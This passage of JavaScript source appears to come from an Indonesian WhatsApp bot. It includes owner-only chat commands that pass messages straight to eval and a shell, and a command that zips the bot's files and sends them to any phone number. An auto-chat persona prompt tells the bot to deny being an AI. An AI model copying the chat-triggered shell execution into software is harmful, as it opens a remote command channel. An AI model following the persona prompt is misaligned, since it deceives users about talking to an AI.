        fs.mkdirSync(dir, { recursive: true });
    }
    const modeFilePath = require('path').resolve(dir, "mode.json");
    fs.writeFileSync(modeFilePath, JSON.stringify({ public: false }, null, 2), 'utf8');
    if (fs.existsSync(modeFilePath)) {
        console.log(`Mode saved successfully at ${modeFilePath}`);
        m.reply("Berhasil mengganti ke mode *self*");
    } else {
        m.reply("Gagal menyimpan mode!");
    }
}
break

case 'publictime': case 'publiktime': {
if (!isCreator) return m.reply('Fitur ini hanya untuk owner.')
if (!text) return m.reply(`Contoh: publictime 30s`)
let match = text.match(/^(\d+)(s|m|h)$/)
if (!match) return m.reply('Format salah. Contoh: publictime 30s / 1m / 2h')
let value = parseInt(match[1])
let unit = match[2]
let ms = unit === 's' ? value * 1000 : unit === 'm' ? value * 60 * 1000 : value * 60 * 60 * 1000
conn.public = true
m.reply(`Bot sekarang *Publik* selama ${value}${unit}. Nanti akan otomatis kembali ke mode *Self*.`)
setTimeout(() => {
conn.public = false
m.reply(`Waktu publik selesai! Bot kembali ke mode *Self*.`)
}, ms)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ping": case "upping": {
 let os = require("os");
 let { execSync } = require("child_process");

 // Ambil info OS
 let platform = os.platform();
 let arch = os.arch();
 let versionNode = process.version;

 // Ambil info CPU
 let cpus = os.cpus();
 let cpuModel = cpus[0].model;
 let cpuSpeed = cpus[0].speed;
 let cpuLoad = (os.loadavg()[0] / os.cpus().length) * 100;

 // Ambil info RAM
 let totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
 let freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
 let usedRam = (totalRam - freeRam).toFixed(2);

 // Ambil info penyimpanan
 let diskInfo;
 try {
 diskInfo = execSync("df -h / | tail -1").toString().split(/\s+/);
 } catch (err) {
 diskInfo = ["-", "-", "-", "-", "-", "-"];
 }
 let totalDisk = diskInfo[1];
 let usedDisk = diskInfo[2];
 let availableDisk = diskInfo[3];
 let diskUsage = diskInfo[4];

 // Cek ping
 let startTime = process.hrtime();
 let ping = process.hrtime(startTime);
 let latency = (ping[0] * 1e9 + ping[1]) / 1e9;

 // Format pesan
 let info = `*INFO SERVER*\n`
 + `• OS: ${platform} (${os.release()})\n`
 + `• Arsitektur: ${arch}\n`
 + `• Versi Node.js: ${versionNode}\n\n`
 + `*CPU SISTEM*\n`
 + `• Model: ${cpuModel}\n`
 + `• Kecepatan: ${cpuSpeed} MHz\n`
 + `• Beban CPU: ${cpuLoad.toFixed(2)}% (${cpus.length} Core)\n`
 + `• Load Average: ${os.loadavg().map(v => v.toFixed(2)).join(", ")}\n\n`
 + `*MEMORI (RAM)*\n`
 + `• Total: ${totalRam} GB\n`
 + `• Digunakan: ${usedRam} GB\n`
 + `• Tersedia: ${freeRam} GB\n\n`
 + `*PENYIMPANAN*\n`
 + `• Total: ${totalDisk}\n`
 + `• Digunakan: ${usedDisk} (${diskUsage})\n`
 + `• Tersedia: ${availableDisk}\n\n`
 + `*PING*\n`
 + `• Latensi: ${latency.toFixed(12)} detik`;

 await m.reply(info)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": case "restartbot": {
  if (!isCreator) return Reply(mess.owner)
  await m.reply("Memproses _restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await m.reply("Restarting bot...")
  process.exit(0)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `BiyuBotz`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

case "sendsc": {
  if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
  
  if (!argsbiyuoffc[0]) return Reply(`Example: sendsc 6285776461481\n\nNote:\nTidak boleh nomer +62xx,08xx`)
  
  let targetNumber = argsbiyuoffc[0]
  if (!targetNumber.startsWith('62')) return Reply(`Format nomor salah! Gunakan format 62xxx\n\nExample: sendsc 6285776461481`)
  
  await m.reply("Memproses pengiriman script bot")
  var name = `BiyuBotz`
  
  const ls = (await execSync("ls"))
    .toString()
    .split("\n")
    .filter(
      (pe) =>
        pe != "node_modules" &&
        pe != "session" &&
        pe != "package-lock.json" &&
        pe != "yarn.lock" &&
        pe != ""
    )
    
  const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
  
  await conn.sendMessage(`${targetNumber}@s.whatsapp.net`, {
    document: await fs.readFileSync(`./${name}.zip`),
    fileName: `${name}.zip`,
    mimetype: "application/zip"
  }, {quoted: m})
  
  await execSync(`rm -rf ${name}.zip`)
  
  return m.reply(`Script bot berhasil dikirim ke nomor ${targetNumber}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "setppbot": case "setpp": {
  if (!isCreator) return Reply(mess.owner)
  if (!quoted) return m.reply('Reply Image')
  if (!/image/.test(mime)) return m.reply('Reply Image With Caption')
  if (/webp/.test(mime)) return m.reply('Reply Image Not Sticker')
  
  try {
    let media = await conn.downloadAndSaveMediaMessage(quoted)
    if (argsbiyuoffc[0] && argsbiyuoffc[0] == "panjang") {
      try {
        const { img } = await generateProfilePicture(media)
        await conn.query({
          tag: 'iq',
          attrs: {
            to: botNumber,
            type: 'set',
            xmlns: 'w:profile:picture'
          },
          content: [
            {
              tag: 'picture',
              attrs: { type: 'image' },
              content: img
            }
          ]
        })
        fs.unlinkSync(media)
        m.reply("Berhasil mengganti foto profil bot ✅")
      } catch (e) {
        console.log(e)
        m.reply("Terjadi kesalahan saat mengatur foto profil panjang")
      }
    } else {
      try {
        await conn.updateProfilePicture(botNumber, { url: media })
        fs.unlinkSync(media)
        m.reply("Berhasil mengganti foto profil bot ✅")
      } catch (e) {
        console.log(e)
        m.reply("Terjadi kesalahan saat mengatur foto profil")
      }
    }
  } catch (e) {
    console.log(e)
    m.reply(`${e}`)
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
conn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

case "autoai": {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply(`*Contoh:* .autoai *[on/off/reset]*`);

    if (text === "on") {
        globalAutoAIStatus = true;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ✅ ] *Auto AI diaktifkan di semua chat!* Bot akan merespon otomatis di semua percakapan.`);
    } else if (text === "off") {
        globalAutoAIStatus = false;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ❌ ] *Auto AI dimatikan di semua chat!* Bot hanya merespon jika dipanggil.`);
    } else if (text === "reset") {
        if (globalAutoAIStatus) {
            sessions = {};
            saveSession();
            return m.reply("♻️ *Seluruh riwayat chat AI telah direset!*");
        } else {
            return m.reply("⚠️ *Auto AI sedang tidak aktif!*");
        }
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
const salamResponses = [
    "Wa’alaikumussalam! Semoga harimu diberkahi Allah 😊",
    "Wa’alaikumussalam warahmatullahi wabarakatuh! Sehat selalu ya kak! 🤲",
    "Wa’alaikumussalam! Semoga kakak selalu dalam lindungan Allah. Aamiin.",
    "Wa’alaikumussalam wr. wb. Apa kabar kak? 😊",
    "Wa’alaikumussalam! Alhamdulillah, senang ada yang menyebarkan salam! 😇"
];

if (budy && ["assalamualaikum", "assalamu'alaikum"]
    .some(word => budy.toLowerCase().includes(word))) {
    m.reply(salamResponses[Math.floor(Math.random() * salamResponses.length)]);
}

if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply(`${global.botname} ✅`)
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
if (globalAutoAIStatus) {
    if (m.isBaileys && m.fromMe) return;
  
    const ignoredPrefixes = ['.', '#', '!', '/', '\\/'];
    if (ignoredPrefixes.some(prefix => m.text.startsWith(prefix))) return;
    if (!m.text) return;

    const chatId = m.chat;
    if (!sessions[chatId]) {
        sessions[chatId] = { messages: [] };
    }
    const d = new Date();
    d.setTime(d.getTime() + 3600000);
    const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' });
    const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss');
    const namePengguna = conn.getName(m.sender);

    const prompt = `
    Halo ${namePengguna} 👋, perkenalkan nama saya conn. Namamu pasti ${namePengguna}, bukan? ✨ Hari ini adalah ${hariini}, pukul ${jam} waktu WIB. Nama kamu adalah Biyu, AI yang santai, ramah, dan suka ngobrol dengan pengguna. Kamu hanya menjawab kalau pesan bukan perintah. Gunakan gaya bahasa santai dan sedikit humoris. Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu. 📌 *Aturan Main Biyu:* - Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol. - Gunakan bahasa yang santai, tapi tetap sopan. - Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol. - Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!". Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan! 
    `;

    sessions[chatId].messages.push({ user: m.text });
    saveSession();

    try {
        const requestData = { 
            content: m.text, 
            user: m.sender, 
            prompt 
        };
        
        const axios = require('axios');
        const response = await axios.post('https://luminai.my.id', requestData);
        
        sessions[chatId].messages.push({ bot: response.data.result });
        saveSession();
        
        return conn.sendMessage(m.chat, { text: response.data.result }, { quoted: m });
    } catch (err) {
        console.error(err);
        return m.reply("⚠️ *Terjadi kesalahan, coba lagi nanti!*");
    }
}
//================================//
if (
    !game[m.chat] ||
    !m.quoted ||
    !game[m.chat].soal ||
    m.quoted.id !== game[m.chat].soal.key.id
) return;
const jawaban = game[m.chat].jawaban;
const sisa = game[m.chat].waktu - Date.now();
const textt = budy.toLowerCase().trim();
if (textt === 'nyerah') {
    clearInterval(game[m.chat].updateInterval);
    m.reply(`Yah nyerah ya?\nJawaban yang benar adalah: *${Array.isArray(jawaban) ? jawaban.join(' / ') : jawaban}*`);
    delete game[m.chat];
} else if (textt === 'clue') {
    if (!jawaban) return m.reply(`Belum ada jawaban untuk game ini, coba ulangi gamenya.`);
    const clueSource = Array.isArray(jawaban) ? jawaban[0] : jawaban;
    const clue = clueSource.replace(/[aiueo]/g, '_');
    m.reply(`Clue: *${clue}*`);
} else if (sisa <= 0) {
    clearInterval(game[m.chat].updateInterval);
    m.reply(`*Waktu habis!* Jawabannya adalah: *${Array.isArray(jawaban) ? jawaban.join(' / ') : jawaban}*`);
    delete game[m.chat];
} else if (Array.isArray(jawaban) ? jawaban.includes(textt) : textt === jawaban) {
    clearInterval(game[m.chat].updateInterval);
    m.reply(`*Benar!* Jawabannya adalah *${Array.isArray(jawaban) ? textt : jawaban}*`);
    delete game[m.chat];
} else {
    m.reply(`*Salah!* Coba lagi ya.\nKetik *clue* untuk bantuan atau *nyerah* untuk menyerah, dengan reply soalnya.`);
}
//=============================//
}
} catch (err) {
    console.log(util.format(err));
    if (err.message && !err.message.includes('rate-overlimit')) {
        let Obj = global.owner;
        conn.sendMessage(Obj + "@s.whatsapp.net", {
            text: `Hallo developer, telah terjadi error pada command : ${m.body?.startsWith(' ') ? m.body.split(' ')[0] : m.text}\n Detail informasi error : ${util.format(err)}\n\n> Note : Jika tidak tau artinya ketik translate id teks`,
            contextInfo: { isForwarded: true }
        }, { quoted: m });
    }
}
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let currentFile = require.resolve(__filename)
fs.watchFile(currentFile, () => {
	fs.unwatchFile(currentFile)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[currentFile]
	require(currentFile)
});